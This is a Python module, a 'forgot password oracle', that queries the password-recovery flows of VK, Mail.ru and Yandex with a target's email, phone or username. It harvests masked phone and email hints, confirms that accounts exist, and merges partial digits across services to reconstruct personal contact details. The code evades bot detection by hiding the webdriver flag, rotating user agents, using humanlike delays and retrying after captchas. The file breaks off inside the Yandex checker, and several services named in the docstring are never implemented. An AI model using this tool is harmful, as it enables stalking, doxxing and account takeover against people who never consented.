"""
Forgot Password Oracle — Masked Hint Extraction
=================================================
Extracts masked contact hints from "forgot password" endpoints of 8 Russian services.
The idea: submit email/phone to password recovery, parse the masked hint response.
Never actually resets anything — just reads the hint.

Services:
1. VK (vk.com) — email→masked phone, phone→masked email
2. Mail.ru — email→masked phone
3. Yandex — login→masked phone
4. OK.ru (Odnoklassniki) — email/phone→masked hint
5. Gosuslugi (ESIA) — phone→masked email, email→masked phone [GEO_BLOCKED]
6. Telegram — phone→account existence (Telethon)
7. Avito — email/phone→masked hint
8. Sberbank Online — phone→masked hint [GEO_BLOCKED]

Cross-correlation: if Mail.ru shows '+7 916 ***-**-67' and VK shows '+7 *** ***-45-**',
merge to reconstruct more digits.

Usage:
    oracle = ForgotPasswordOracle()
    results = oracle.check_all(email="test@mail.ru", phone="+79161234567")
    merged = cross_correlate_hints(results)
"""

import json
import logging
import os
import re
import time
import random
from abc import ABC, abstractmethod
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field

import requests

from app.utils.phone import normalize_phone

# Optional: Telethon for Telegram checker
try:
    from telethon.sync import TelegramClient
    from telethon.errors import (
        PhoneNumberInvalidError,
        FloodWaitError,
        ApiIdInvalidError,
    )
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Result dataclass
# ---------------------------------------------------------------------------

@dataclass
class ForgotPasswordResult:
    """Single result from a forgot-password hint extraction."""
    service: str
    exists: bool = False
    masked_hint: Optional[str] = None
    hint_type: Optional[str] = None  # "phone", "email", "name", or None
    confidence: float = 0.0
    error: Optional[str] = None
    raw_data: Dict = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize to dict for JSON response."""
        return {
            'service': self.service,
            'exists': self.exists,
            'masked_hint': self.masked_hint,
            'hint_type': self.hint_type,
            'confidence': self.confidence,
            'error': self.error,
        }


# ---------------------------------------------------------------------------
# Base class
# ---------------------------------------------------------------------------

class ForgotPasswordChecker(ABC):
    """
    Base class for forgot-password hint extraction.

    Provides:
    - requests.Session with realistic browser headers
    - Random delay between requests (2-5s)
    - Unified error handling
    """

    SERVICE_NAME: str = "unknown"
    SUPPORTS_EMAIL: bool = False
    SUPPORTS_PHONE: bool = False
    GEO_RESTRICTED: bool = False  # True for checkers that only work from Russian IP

    # Realistic browser headers — rotated per-session
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) '
        'Gecko/20100101 Firefox/123.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    ]

    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(self.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                      'image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'DNT': '1',
        })
        self.logger = logging.getLogger(
            f"{__name__}.{self.__class__.__name__}"
        )

    # ---- helpers ----

    def _random_delay(self, min_s: float = 2.0, max_s: float = 5.0):
        """Sleep random amount to mimic human behaviour."""
        delay = random.uniform(min_s, max_s)
        time.sleep(delay)

    def _make_result(self, **kwargs) -> ForgotPasswordResult:
        """Create result pre-filled with service name."""
        return ForgotPasswordResult(service=self.SERVICE_NAME, **kwargs)

    # ---- public API ----

    def check_email(self, email: str) -> Optional[ForgotPasswordResult]:
        """Check forgot-password endpoint with email. Returns result or None."""
        if not self.SUPPORTS_EMAIL:
            return None
        try:
            self._random_delay()
            return self._check_email_impl(email.lower().strip())
        except requests.exceptions.Timeout:
            self.logger.warning(f"{self.SERVICE_NAME}: timeout checking email")
            return self._make_result(error="timeout")
        except requests.exceptions.ConnectionError:
            self.logger.warning(f"{self.SERVICE_NAME}: connection error")
            return self._make_result(error="connection_error")
        except Exception as e:
            self.logger.error(
                f"{self.SERVICE_NAME}: unexpected error: {e}", exc_info=True
            )
            return self._make_result(error=str(e))

    def check_phone(self, phone: str) -> Optional[ForgotPasswordResult]:
        """Check forgot-password endpoint with phone. Returns result or None."""
        if not self.SUPPORTS_PHONE:
            return None
        try:
            self._random_delay()
            normalized = normalize_phone(phone)
            return self._check_phone_impl(normalized)
        except requests.exceptions.Timeout:
            self.logger.warning(f"{self.SERVICE_NAME}: timeout checking phone")
            return self._make_result(error="timeout")
        except requests.exceptions.ConnectionError:
            self.logger.warning(f"{self.SERVICE_NAME}: connection error")
            return self._make_result(error="connection_error")
        except Exception as e:
            self.logger.error(
                f"{self.SERVICE_NAME}: unexpected error: {e}", exc_info=True
            )
            return self._make_result(error=str(e))

    # ---- subclasses implement these ----

    @abstractmethod
    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        pass

    @abstractmethod
    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        pass


# ---------------------------------------------------------------------------
# VK Checker
# ---------------------------------------------------------------------------

class VKChecker(ForgotPasswordChecker):
    """
    VK forgot password: POST to https://vk.com/login?act=forgot
    - email → returns masked phone hint ("+7 9** ***-**-67")
    - phone → returns masked email hint ("iv***@mail.ru")
    """

    SERVICE_NAME = "vk"
    SUPPORTS_EMAIL = True
    SUPPORTS_PHONE = True

    FORGOT_URL = "https://vk.com/login?act=forgot"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.session.headers.update({
            'Origin': 'https://vk.com',
            'Referer': 'https://vk.com/restore',
        })

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        """Submit email to VK password recovery, extract masked phone."""
        resp = self.session.post(
            self.FORGOT_URL,
            data={'email': email},
            timeout=self.timeout,
            allow_redirects=True,
        )
        return self._parse_vk_response(resp.text, input_type='email')

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        """Submit phone to VK password recovery, extract masked email."""
        resp = self.session.post(
            self.FORGOT_URL,
            data={'email': phone},  # VK uses 'email' field for both
            timeout=self.timeout,
            allow_redirects=True,
        )
        return self._parse_vk_response(resp.text, input_type='phone')

    def _parse_vk_response(self, html: str, input_type: str) -> ForgotPasswordResult:
        """Parse VK response HTML for masked hints."""
        result = self._make_result()

        # Account not found indicators
        not_found_markers = [
            'Неверный логин или адрес',
            'не зарегистрирован',
            'Пользователь не найден',
            'page_not_found',
        ]
        if any(m in html for m in not_found_markers):
            result.exists = False
            result.confidence = 0.80
            return result

        # Look for masked phone patterns: +7 9** ***-**-67, +7 *** ***-**-45
        phone_pattern = re.compile(
            r'\+7\s*[\d\*]{1,3}\s*[\d\*]{3}[-\s][\d\*]{2}[-\s][\d\*]{2}'
        )
        phone_match = phone_pattern.search(html)
        if phone_match:
            result.exists = True
            result.masked_hint = phone_match.group().strip()
            result.hint_type = 'phone'
            result.confidence = 0.85
            return result

        # Look for masked email patterns: iv***@mail.ru, a****v@gmail.com
        email_pattern = re.compile(
            r'[a-zA-Z0-9][a-zA-Z0-9\*]{1,30}@[a-zA-Z0-9]+\.[a-zA-Z]{2,}'
        )
        email_match = email_pattern.search(html)
        if email_match:
            result.exists = True
            result.masked_hint = email_match.group().strip()
            result.hint_type = 'email'
            result.confidence = 0.82
            return result

        # Page loaded with a recovery form → account likely exists
        # but we couldn't parse the specific hint
        recovery_markers = [
            'restore_access',
            'password_edit',
            'Восстановление доступа',
            'Мы отправили',
        ]
        if any(m in html for m in recovery_markers):
            result.exists = True
            result.confidence = 0.60
            return result

        return result


# ---------------------------------------------------------------------------
# VK Username Forgot Checker (Playwright-based)
# ---------------------------------------------------------------------------

# Optional: Playwright for VK username checker
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


class VKUsernameForgotChecker:
    """
    VK forgot-password via Playwright: submit screen_name to VK ID recovery.
    Confirms account existence via id.vk.com/restore flow.

    STATUS (Feb 2026): ACCOUNT EXISTENCE ONLY.
    VK's new id.vk.com recovery flow does NOT show masked phone/email hints.
    After submitting a username, VK shows one of:
    - "Невозможно восстановить доступ" → account exists, no recovery path
    - "Укажите номер телефона для привязки" → account exists, phone recovery
    - "Такой аккаунт не найден" → account does not exist
    VK no longer displays masked phones like "+7 916 ***-**-67" in this flow.
    The hint extraction code (Priorities 1-3) is retained for forward compat
    in case VK re-enables hints, but currently all results are existence-only.

    Uses the new VK ID restore flow at id.vk.com/restore:
    1. Navigate to id.vk.com/restore
    2. Click "Я не помню" (I don't remember my number)
    3. Enter username/link in the link input field
    4. Click "Продолжить" (Continue)
    5. Parse result: account exists or not found

    Response types from VK ID:
    - "Невозможно восстановить" — account exists but no recovery (no photos)
    - "Укажите номер телефона для привязки" — account exists + phone recovery
    - "Такой аккаунт не найден" — account not found
    """

    SERVICE_NAME = "vk_forgot_password"

    # VK patched the recovery flow in early 2026 — no masked hints shown.
    # Only account existence can be confirmed.
    MODE = "account_existence_only"

    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) '
        'Gecko/20100101 Firefox/132.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    ]

    RESTORE_URL = "https://id.vk.com/restore"

    # VK ID "not found" markers (new id.vk.com flow)
    NOT_FOUND_MARKERS = [
        'Такой аккаунт не найден',
        'аккаунт не найден',
        'не найден',
    ]

    # Account exists but cannot restore (no photos for identity verification)
    CANNOT_RESTORE_MARKERS = [
        'Невозможно восстановить доступ',
        'нет фото по которым можно установить',
    ]

    # Account exists + phone recovery available
    ASK_PHONE_MARKERS = [
        'Укажите номер телефона для привязки',
        'номер телефона для привязки',
        'Укажите доступный номер',
        'на него придёт SMS для входа',
        'на него придет SMS для входа',
    ]

    # CAPTCHA / bot detection markers
    CAPTCHA_MARKERS = [
        'captcha',
        'Captcha',
        'recaptcha',
        'что вы не робот',
        'введите код',
    ]

    # Rate limit markers
    RATE_LIMIT_MARKERS = [
        'Слишком много запросов',
        'Слишком много попыток',
        'too many requests',
        'Попробуйте позже',
        'Попробуйте снова через',
        'try again later',
    ]

    # Masked phone patterns — VK uses various formats:
    # +7 916 ***-**-67, +7 9** ***-**-67, +7 *** *** ** 67
    # Also in API JSON: "+7 *** ***-**-67", "7916***4567"
    PHONE_PATTERN = re.compile(
        r'\+?7[\s\-]?[\d\*]{1,3}[\s\-]?[\d\*]{3}[\s\-]?[\d\*]{2}[\s\-]?[\d\*]{2}'
    )

    # Masked email pattern: iv***@mail.ru, a****v@gmail.com
    EMAIL_PATTERN = re.compile(
        r'[a-zA-Z0-9][a-zA-Z0-9\*]{1,30}@[a-zA-Z0-9]+\.[a-zA-Z]{2,}'
    )

    # Debug directory for snapshots of unrecognized responses
    _DEBUG_DIR = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        '..', '..', '..', 'tests', 'debug_vk_oracle',
    )

    # Carrier code extraction: first 3 digits after +7
    CARRIER_PATTERN = re.compile(r'\+7\s*(\d{3})')
    # Last 2 digits extraction
    LAST_DIGITS_PATTERN = re.compile(r'(\d{2})\s*$')

    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.logger = logging.getLogger(f"{__name__}.VKUsernameForgotChecker")
        self._rate_limited = False  # per-IP 24h rate limit flag

    @staticmethod
    def _normalize_username(username: str) -> str:
        """Strip VK URL prefixes, return bare screen_name."""
        username = username.strip()
        for prefix in ('https://vk.com/', 'http://vk.com/', 'vk.com/',
                       'https://id.vk.com/', 'http://id.vk.com/', 'id.vk.com/'):
            if username.lower().startswith(prefix):
                username = username[len(prefix):]
                break
        # Strip trailing slashes / query params
        username = username.split('?')[0].split('#')[0].rstrip('/')
        return username

    def _extract_partial_digits(self, masked: str) -> dict:
        """Extract carrier code and last digits from masked phone."""
        result = {}
        carrier_match = self.CARRIER_PATTERN.search(masked)
        if carrier_match:
            result['carrier_code'] = carrier_match.group(1)
        # Last 2 visible digits (skip stars)
        digits_only = re.sub(r'[^\d\*]', '', masked)
        if digits_only:
            # Find last 2 actual digits at the end
            trailing = re.search(r'(\d{2})[\*]*$', digits_only)
            if trailing:
                result['last_digits'] = trailing.group(1)
            else:
                # Look for any last digit pair
                all_digits = re.findall(r'\d', masked)
                if len(all_digits) >= 2:
                    result['last_digits'] = ''.join(all_digits[-2:])
        return result

    def check_username(self, username: str) -> Optional[ForgotPasswordResult]:
        """
        Submit VK username to forgot-password, check account existence
        and extract masked phone/email if available.

        Returns ForgotPasswordResult or None on unrecoverable error.
        Retry logic is here (not in _run_playwright) to avoid nesting
        sync_playwright() contexts.
        """
        if not PLAYWRIGHT_AVAILABLE:
            self.logger.warning("Playwright not installed — skipping VK username oracle")
            return ForgotPasswordResult(
                service=self.SERVICE_NAME,
                error="playwright_unavailable",
            )

        # Short-circuit if we already hit VK's 24h rate limit
        if self._rate_limited:
            return ForgotPasswordResult(
                service=self.SERVICE_NAME,
                error="rate_limited",
            )

        username = self._normalize_username(username)
        if not username:
            return None

        # Random delay to mimic human
        time.sleep(random.uniform(1.0, 3.0))

        result = None
        for attempt in range(2):
            try:
                result = self._run_playwright(username)
            except Exception as e:
                self.logger.error(
                    f"VK username oracle error for {username}: {e}",
                    exc_info=True,
                )
                return ForgotPasswordResult(
                    service=self.SERVICE_NAME,
                    error=str(e),
                )

            if result is None:
                return None

            # Retry on captcha (first attempt only, wait 15s)
            if result.error == 'captcha' and attempt == 0:
                self.logger.info("VK captcha — waiting 15s and retrying")
                time.sleep(15)
                continue

            # Rate limit: set flag and do NOT retry (24h cooldown)
            if result.error == 'rate_limited':
                self._rate_limited = True
                self.logger.warning(
                    f"VK 24h rate limit hit for {username} — "
                    "skipping all subsequent oracle checks"
                )
                return result

            # Any other result: return as-is
            return result

        # Exhausted retries
        return result

    def _parse_api_responses(self, captured: list, username: str) -> Optional[dict]:
        """
        Parse captured VK API responses for masked phone/email hints.
        VK ID SPA makes XHR calls that return JSON with structured data.
        Returns dict with hint_type, masked_hint, confidence, raw_data or None.
        """
        for resp_info in captured:
            body = resp_info.get('body')
            if not body:
                continue
            # Try JSON parse
            try:
                data = json.loads(body)
            except (json.JSONDecodeError, ValueError):
                # Not JSON — check raw text for masked patterns
                phone_m = self.PHONE_PATTERN.search(body)
                if phone_m:
                    masked = phone_m.group().strip()
                    partial = self._extract_partial_digits(masked)
                    return {
                        'hint_type': 'phone',
                        'masked_hint': masked,
                        'confidence': 0.85,
                        'raw_data': {
                            'username': username,
                            'source': 'api_response_text',
                            'url': resp_info.get('url', ''),
                            'raw_masked': masked,
                            **partial,
                        },
                    }
                continue

            # Walk the JSON tree looking for phone/email masks
            hint = self._extract_hint_from_json(data, username, resp_info.get('url', ''))
            if hint:
                return hint

        return None

    def _extract_hint_from_json(self, data: Any, username: str, url: str) -> Optional[dict]:
        """Recursively search JSON structure for masked phone/email hints."""
        if isinstance(data, str):
            # Check string values for phone masks
            phone_m = self.PHONE_PATTERN.search(data)
            if phone_m:
                masked = phone_m.group().strip()
                partial = self._extract_partial_digits(masked)
                return {
                    'hint_type': 'phone',
                    'masked_hint': masked,
                    'confidence': 0.85,
                    'raw_data': {
                        'username': username,
                        'source': 'api_json',
                        'url': url,
                        'raw_masked': masked,
                        **partial,
                    },
                }
            # Check for email masks
            email_m = self.EMAIL_PATTERN.search(data)
            if email_m:
                masked = email_m.group().strip()
                return {
                    'hint_type': 'email',
                    'masked_hint': masked,
                    'confidence': 0.75,
                    'raw_data': {
                        'username': username,
                        'source': 'api_json',
                        'url': url,
                        'raw_masked': masked,
                    },
                }
            return None

        if isinstance(data, dict):
            # Check known VK response fields first
            for key in ('phone_mask', 'phone', 'masked_phone', 'phone_hint',
                        'phone_number', 'phone_masked', 'mask'):
                val = data.get(key)
                if val and isinstance(val, str) and ('*' in val or '+7' in val):
                    partial = self._extract_partial_digits(val)
                    return {
                        'hint_type': 'phone',
                        'masked_hint': val,
                        'confidence': 0.90,
                        'raw_data': {
                            'username': username,
                            'source': 'api_json_field',
                            'url': url,
                            'field': key,
                            'raw_masked': val,
                            **partial,
                        },
                    }
            for key in ('email_mask', 'email', 'masked_email', 'email_hint',
                        'email_masked'):
                val = data.get(key)
                if val and isinstance(val, str) and '*' in val and '@' in val:
                    return {
                        'hint_type': 'email',
                        'masked_hint': val,
                        'confidence': 0.80,
                        'raw_data': {
                            'username': username,
                            'source': 'api_json_field',
                            'url': url,
                            'field': key,
                            'raw_masked': val,
                        },
                    }
            # Recurse into values
            for v in data.values():
                hint = self._extract_hint_from_json(v, username, url)
                if hint:
                    return hint
        elif isinstance(data, list):
            for item in data:
                hint = self._extract_hint_from_json(item, username, url)
                if hint:
                    return hint

        return None

    def _save_debug_snapshot(self, page, username: str, body_text: str,
                             html: str, captured_responses: list):
        """Save debug snapshot for unrecognized VK responses."""
        try:
            debug_dir = os.path.normpath(self._DEBUG_DIR)
            os.makedirs(debug_dir, exist_ok=True)
            ts = int(time.time())
            prefix = f"{ts}_{username}"

            # Screenshot
            screenshot_path = os.path.join(debug_dir, f"{prefix}.png")
            page.screenshot(path=screenshot_path, full_page=True)

            # Body text
            text_path = os.path.join(debug_dir, f"{prefix}_body.txt")
            with open(text_path, 'w', encoding='utf-8') as f:
                f.write(f"URL: {page.url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Timestamp: {ts}\n")
                f.write("=" * 60 + "\n")
                f.write(body_text)

            # HTML
            html_path = os.path.join(debug_dir, f"{prefix}_page.html")
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html)

            # Captured API responses
            if captured_responses:
                api_path = os.path.join(debug_dir, f"{prefix}_api.json")
                with open(api_path, 'w', encoding='utf-8') as f:
                    json.dump(captured_responses, f, indent=2, ensure_ascii=False,
                              default=str)

            self.logger.info(
                f"Debug snapshot saved to {debug_dir}/{prefix}*"
            )
        except Exception as e:
            self.logger.warning(f"Failed to save debug snapshot: {e}")

    def _run_playwright(self, username: str) -> ForgotPasswordResult:
        """
        Launch Playwright, navigate to VK ID restore, submit username.
        Single attempt — retry logic lives in check_username().
        """
        result = ForgotPasswordResult(service=self.SERVICE_NAME)
        captured_api_responses = []

        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=['--disable-blink-features=AutomationControlled'],
            )
            try:
                context = browser.new_context(
                    user_agent=random.choice(self.USER_AGENTS),
                    locale='ru-RU',
                    viewport={'width': 1280, 'height': 720},
                )
                page = context.new_page()
                page.set_default_timeout(self.timeout * 1000)

                # Anti-detection: remove webdriver flag
                page.add_init_script(
                    'Object.defineProperty(navigator, "webdriver", {get: () => undefined})'
                )

                # Intercept API responses from VK domains
                def _on_response(response):
                    url = response.url
                    if any(d in url for d in (
                        'id.vk.com', 'login.vk.com', 'api.vk.com',
                        'vk.com/auth', 'vk.com/login', 'vk.com/restore',
                    )):
                        try:
                            body = response.text()
                            captured_api_responses.append({
                                'url': url,
                                'status': response.status,
                                'body': body,
                            })
                        except Exception as e:
                            logger.debug(f"[ForgotPasswordOracle] API response body read failed: {e}")
                            captured_api_responses.append({
                                'url': url,
                                'status': response.status,
                                'body': None,
                            })

                page.on('response', _on_response)

                # Navigate to VK ID restore page
                page.goto(self.RESTORE_URL, wait_until='networkidle', timeout=30000)
                time.sleep(random.uniform(1.0, 2.0))

                body_text = page.locator('body').inner_text()
                body_text = body_text.replace('\xa0', ' ')

                # Check for bot detection on initial load
                if any(m.lower() in body_text.lower() for m in self.CAPTCHA_MARKERS):
                    result.error = "captcha"
                    self.logger.warning(f"VK bot detection for username {username}")
                    return result

                # Step 1: Click "Я не помню" (I don't remember) to get username input
                forget_link = page.get_by_text('Я не помню')
                if forget_link.count() == 0:
                    # Fallback: try direct link input if already visible
                    link_input = page.locator('input[name="link"]')
                    if link_input.count() == 0:
                        result.error = "ui_changed_no_forget_link"
                        return result
                else:
                    forget_link.first.click()
                    time.sleep(random.uniform(1.0, 2.0))

                # Step 2: Fill username in the link input
                link_input = page.locator('input[name="link"]')
                if link_input.count() == 0:
                    result.error = "ui_changed_no_link_input"
                    return result

                link_input.fill(username)
                time.sleep(random.uniform(0.3, 0.8))

                # Step 3: Click "Продолжить" (Continue)
                continue_btn = page.get_by_text('Продолжить')
                if continue_btn.count() == 0:
                    result.error = "ui_changed_no_continue_btn"
                    return result

                # Clear pre-click API captures, we only care about post-click
                pre_click_count = len(captured_api_responses)
                continue_btn.first.click()

                # Wait for SPA to load the response
                try:
                    page.wait_for_load_state('networkidle', timeout=15000)
                except Exception as e:
                    logger.debug(f"[ForgotPasswordOracle] networkidle wait timed out: {e}")
                # Extra wait for SPA rendering
                time.sleep(random.uniform(1.5, 3.0))

                body_text = page.locator('body').inner_text()
                # Normalize non-breaking spaces (VK uses \xa0 extensively)
                body_text = body_text.replace('\xa0', ' ')
                html = page.content()
                current_url = page.url

                # Slice to only post-click API responses
                post_click_responses = captured_api_responses[pre_click_count:]

                self.logger.debug(
                    f"VK oracle [{username}]: url={current_url}, "
                    f"body_len={len(body_text)}, "
                    f"api_responses={len(post_click_responses)}"
                )

                # --- Priority 1: Parse captured API responses for hints ---
                api_hint = self._parse_api_responses(
                    post_click_responses, username
                )
                if api_hint:
                    result.exists = True
                    result.confidence = api_hint['confidence']
                    result.hint_type = api_hint['hint_type']
                    result.masked_hint = api_hint['masked_hint']
                    result.raw_data = api_hint.get('raw_data', {})
                    self.logger.info(
                        f"VK forgot password oracle: found "
                        f"{api_hint['hint_type']} hint "
                        f"'{api_hint['masked_hint']}' from API "
                        f"for user {username}"
                    )
                    return result

                # --- Priority 2: Text-based parsing of page content ---

                # Check for rate limiting
                if any(m.lower() in body_text.lower()
                       for m in self.RATE_LIMIT_MARKERS):
                    result.error = "rate_limited"
                    return result

                # Check CAPTCHA
                if any(m.lower() in body_text.lower()
                       for m in self.CAPTCHA_MARKERS):
                    result.error = "captcha"
                    self.logger.warning(
                        f"VK CAPTCHA detected for username {username}"
                    )
                    return result

                # Check "not found"
                if any(m in body_text for m in self.NOT_FOUND_MARKERS):
                    result.exists = False
                    result.confidence = 0.85
                    return result

                # Check "cannot restore" — account exists, no recovery
                if any(m in body_text for m in self.CANNOT_RESTORE_MARKERS):
                    result.exists = True
                    result.confidence = 0.80
                    result.hint_type = 'existence'
                    result.masked_hint = 'account_exists_no_recovery'
                    result.raw_data = {
                        'username': username, 'recovery': False,
                    }
                    self.logger.info(
                        f"VK forgot password oracle: account exists "
                        f"(no recovery) for user {username}"
                    )
                    return result

                # Check "ask phone" — account exists + phone recovery
                if any(m in body_text for m in self.ASK_PHONE_MARKERS):
                    result.exists = True
                    result.confidence = 0.90
                    result.hint_type = 'existence'
                    result.masked_hint = 'account_exists_phone_recovery'
                    result.raw_data = {
                        'username': username, 'recovery': True,
                    }
                    self.logger.info(
                        f"VK forgot password oracle: account exists "
                        f"(phone recovery) for user {username}"
                    )
                    return result

                # --- Priority 3: Regex search for masked phone/email ---

                # Search both body text AND HTML for masked phone
                for source_text, source_name in [
                    (body_text, 'body_text'), (html, 'html'),
                ]:
                    phone_match = self.PHONE_PATTERN.search(source_text)
                    if phone_match:
                        masked = phone_match.group().strip()
                        partial = self._extract_partial_digits(masked)
                        result.exists = True
                        result.masked_hint = masked
                        result.hint_type = 'phone'
                        result.confidence = 0.85
                        result.raw_data = {
                            'username': username,
                            'hint_type': 'phone',
                            'source': source_name,
                            'raw_masked': masked,
                            **partial,
                        }
                        self.logger.info(
                            f"VK forgot password oracle: found masked "
                            f"phone '{masked}' in {source_name} "
                            f"for user {username}"
                        )
                        return result

                # Search for masked email
                for source_text, source_name in [
                    (body_text, 'body_text'), (html, 'html'),
                ]:
                    email_match = self.EMAIL_PATTERN.search(source_text)
                    if email_match:
                        masked = email_match.group().strip()
                        result.exists = True
                        result.masked_hint = masked
                        result.hint_type = 'email'
                        result.confidence = 0.75
                        result.raw_data = {
                            'username': username,
                            'hint_type': 'email',
                            'source': source_name,
                            'raw_masked': masked,
                        }
                        self.logger.info(
                            f"VK forgot password oracle: found masked "
                            f"email '{masked}' in {source_name} "
                            f"for user {username}"
                        )
                        return result

                # --- Fallback: unrecognized. Save debug snapshot. ---
                self.logger.warning(
                    f"VK unrecognized response for {username}: "
                    f"url={current_url}, "
                    f"body[0:500]={body_text[:500]!r}, "
                    f"api_count={len(post_click_responses)}"
                )
                self._save_debug_snapshot(
                    page, username, body_text, html,
                    post_click_responses,
                )

                result.exists = True
                result.confidence = 0.50
                result.raw_data = {
                    'username': username,
                    'url': current_url,
                    'body_preview': body_text[:500],
                    'api_responses_count': len(post_click_responses),
                }
                return result

            finally:
                browser.close()

        return result


# ---------------------------------------------------------------------------
# Mail.ru Checker
# ---------------------------------------------------------------------------

class MailRuChecker(ForgotPasswordChecker):
    """
    Mail.ru password recovery: POST to https://e.mail.ru/recovery/
    email → returns masked phone hint
    """

    SERVICE_NAME = "mailru"
    SUPPORTS_EMAIL = True
    SUPPORTS_PHONE = False

    RECOVERY_URL = "https://e.mail.ru/recovery/"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.session.headers.update({
            'Origin': 'https://e.mail.ru',
            'Referer': 'https://e.mail.ru/login',
        })

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        """Submit email to Mail.ru recovery, extract masked phone."""
        resp = self.session.post(
            self.RECOVERY_URL,
            data={'email': email},
            timeout=self.timeout,
            allow_redirects=True,
        )
        return self._parse_response(resp.text)

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        # Mail.ru recovery only supports email input
        return self._make_result()

    def _parse_response(self, html: str) -> ForgotPasswordResult:
        """Parse Mail.ru recovery response."""
        result = self._make_result()

        not_found = [
            'не найден',
            'Учётная запись не найдена',
            'Неверный адрес',
            'account_not_found',
        ]
        if any(m in html for m in not_found):
            result.exists = False
            result.confidence = 0.78
            return result

        # Masked phone: +7 9** ***-**-67
        phone_pattern = re.compile(
            r'\+7\s*[\d\*]{1,3}\s*[\d\*]{3}[-\s][\d\*]{2}[-\s][\d\*]{2}'
        )
        phone_match = phone_pattern.search(html)
        if phone_match:
            result.exists = True
            result.masked_hint = phone_match.group().strip()
            result.hint_type = 'phone'
            result.confidence = 0.80
            return result

        # JSON response fallback (Mail.ru sometimes returns JSON)
        try:
            import json
            data = json.loads(html)
            if data.get('status') == 'ok':
                result.exists = True
                result.confidence = 0.72
                masked = data.get('masked_phone') or data.get('phone')
                if masked:
                    result.masked_hint = masked
                    result.hint_type = 'phone'
                    result.confidence = 0.80
            elif data.get('error'):
                result.exists = False
                result.confidence = 0.75
        except (ValueError, TypeError):
            pass

        # Generic recovery page detection
        if 'recovery' in html.lower() and 'sms' in html.lower():
            result.exists = True
            result.confidence = 0.55
        return result


# ---------------------------------------------------------------------------
# Yandex Checker
# ---------------------------------------------------------------------------

class YandexChecker(ForgotPasswordChecker):
    """
    Yandex Passport recovery: POST to https://passport.yandex.ru/restoration/restore
    login → returns JSON with masked phone/email hints
    """

    SERVICE_NAME = "yandex"
    SUPPORTS_EMAIL = True
    SUPPORTS_PHONE = True

    RESTORE_URL = "https://passport.yandex.ru/restoration/restore"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.session.headers.update({
            'Origin': 'https://passport.yandex.ru',
            'Referer': 'https://passport.yandex.ru/restoration',
            'X-Requested-With': 'XMLHttpRequest',
        })

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        """Submit email/login to Yandex restoration."""
        login = email.split('@')[0] if '@yandex' in email else email
        return self._do_restore(login)

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        """Submit phone to Yandex restoration."""
        return self._do_restore(phone)

    def _do_restore(self, login: str) -> ForgotPasswordResult:
        result = self._make_result()

        resp = self.session.post(
            self.RESTORE_URL,
            data={'login': login},
            timeout=self.timeout,
            allow_redirects=True,
        )

        # Try JSON first
        try:
            data = resp.json()
            result.raw_data = data

            if data.get('status') == 'error' or data.get('errors'):
                result.exists = False
                result.confidence = 0.78
                return result

            # Account exists — extract masked hints
            result.exists = True
            masked_phone = data.get('masked_phone') or data.get('phone_number')
            masked_email = data.get('masked_email') or data.get('email')

            if masked_phone:
                result.masked_hint = masked_phone
                result.hint_type = 'phone'
                result.confidence = 0.83
            elif masked_email:
                result.masked_hint = masked_email
                result.hint_type = 'email'
                result.confidence = 0.80
            else:
                result.confidence = 0.65
            return result

        except (ValueError, TypeError):
            pass

        # Fallback: parse HTML
        html = resp.text

        not_found = ['Такого аккаунта нет', 'account.not_found', 'нет аккаунта']
        if any(m in html for m in not_found):
            result.exists = False
            result.confidence = 0.80
            return result

        # Masked phone in HTML
        phone_match = re.search(
            r'\+7\s*[\d\*]{1,3}\s*[\d\*]{3}[-\s][\d\*]{2}[-\s][\d\*]{2}',
            html,
        )
        if phone_match:
            result.exists = True
            result.masked_hint = phone_match.group().strip()
            result.hint_type = 'phone'
            result.confidence = 0.82
            return result

